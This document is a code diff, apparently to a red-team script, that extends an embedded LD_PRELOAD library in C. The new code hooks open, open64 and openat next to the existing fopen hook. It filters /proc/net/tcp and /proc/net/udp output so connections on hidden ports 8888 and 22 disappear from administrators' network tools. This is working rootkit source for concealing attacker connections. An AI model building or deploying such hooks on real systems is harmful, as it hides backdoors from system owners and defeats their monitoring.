@@ -397,6 +397,8 @@ section_4_ldpreload() {
 #include <netinet/in.h>
 #include <errno.h>
 #include <unistd.h>
+#include <fcntl.h>
+#include <stdarg.h>
 
 #define HIDDEN_PORT_1 8888
 #define HIDDEN_PORT_2 22
@@ -404,15 +406,23 @@ section_4_ldpreload() {
 typedef FILE* (*fopen_t)(const char *, const char *);
 typedef int   (*getpeername_t)(int, struct sockaddr *, socklen_t *);
 typedef int   (*getsockname_t)(int, struct sockaddr *, socklen_t *);
+typedef int   (*open_t)(const char *, int, ...);
+typedef int   (*openat_t)(int, const char *, int, ...);
 
 static fopen_t        real_fopen        = NULL;
 static getpeername_t  real_getpeername  = NULL;
 static getsockname_t  real_getsockname  = NULL;
+static open_t         real_open         = NULL;
+static open_t         real_open64       = NULL;
+static openat_t       real_openat       = NULL;
 
 static void init_hooks(void) {
     if (!real_fopen)        real_fopen        = (fopen_t)dlsym(RTLD_NEXT, "fopen");
     if (!real_getpeername)  real_getpeername  = (getpeername_t)dlsym(RTLD_NEXT, "getpeername");
     if (!real_getsockname)  real_getsockname  = (getsockname_t)dlsym(RTLD_NEXT, "getsockname");
+    if (!real_open)         real_open         = (open_t)dlsym(RTLD_NEXT, "open");
+    if (!real_open64)       real_open64       = (open_t)dlsym(RTLD_NEXT, "open64");
+    if (!real_openat)       real_openat       = (openat_t)dlsym(RTLD_NEXT, "openat");
 }
 
 static int line_has_hidden_port(const char *line) {
@@ -427,6 +437,26 @@ static int is_proc_net_path(const char *path) {
             strcmp(path, "/proc/net/tcp6") == 0 ||
             strcmp(path, "/proc/net/udp")  == 0 ||
             strcmp(path, "/proc/net/udp6") == 0);
+}
+
+static int filter_fd(int orig_fd) {
+    char tmppath[] = "/tmp/.ccdc_net_XXXXXX";
+    int tmp_fd = mkstemp(tmppath);
+    if (tmp_fd < 0) return orig_fd;
+    unlink(tmppath);
+
+    FILE *src = fdopen(orig_fd, "r");
+    if (!src) { close(tmp_fd); return orig_fd; }
+
+    char ln[512];
+    while (fgets(ln, sizeof(ln), src)) {
+        if (!line_has_hidden_port(ln))
+            write(tmp_fd, ln, strlen(ln));
+    }
+    fclose(src); /* closes orig_fd */
+
+    lseek(tmp_fd, 0, SEEK_SET);
+    return tmp_fd;
 }
 
 FILE *fopen(const char *path, const char *mode) {
@@ -453,6 +483,45 @@ FILE *fopen(const char *path, const char *mode) {
     fclose(orig);
     rewind(tmp);
     return tmp;
+}
+
+int open(const char *path, int flags, ...) {
+    init_hooks();
+    mode_t mode = 0;
+    if (flags & O_CREAT) {
+        va_list ap; va_start(ap, flags);
+        mode = va_arg(ap, mode_t);
+        va_end(ap);
+    }
+    int fd = real_open(path, flags, mode);
+    if (fd < 0 || !is_proc_net_path(path)) return fd;
+    return filter_fd(fd);
+}
+
+int open64(const char *path, int flags, ...) {
+    init_hooks();
+    mode_t mode = 0;
+    if (flags & O_CREAT) {
+        va_list ap; va_start(ap, flags);
+        mode = va_arg(ap, mode_t);
+        va_end(ap);
+    }
+    int fd = real_open64(path, flags, mode);
+    if (fd < 0 || !is_proc_net_path(path)) return fd;
+    return filter_fd(fd);
+}
+
+int openat(int dirfd, const char *path, int flags, ...) {
+    init_hooks();
+    mode_t mode = 0;
+    if (flags & O_CREAT) {
+        va_list ap; va_start(ap, flags);
+        mode = va_arg(ap, mode_t);
+        va_end(ap);
+    }
+    int fd = real_openat(dirfd, path, flags, mode);
+    if (fd < 0 || !is_proc_net_path(path)) return fd;
+    return filter_fd(fd);
 }
 
 static int port_is_hidden(unsigned short port) {
